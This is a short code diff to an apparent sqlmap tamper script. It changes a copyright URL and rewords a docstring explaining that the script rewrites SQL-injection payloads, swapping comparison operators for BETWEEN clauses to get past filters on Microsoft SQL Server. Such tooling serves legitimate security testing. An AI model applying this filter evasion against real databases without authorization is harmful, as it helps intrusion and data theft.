@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -16,7 +16,7 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     """
-    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
+    Replaces the greater-than operator (>) with NOT BETWEEN 0 AND # and the equal sign (=) with BETWEEN # AND #
 
     Tested against:
         * Microsoft SQL Server 2005
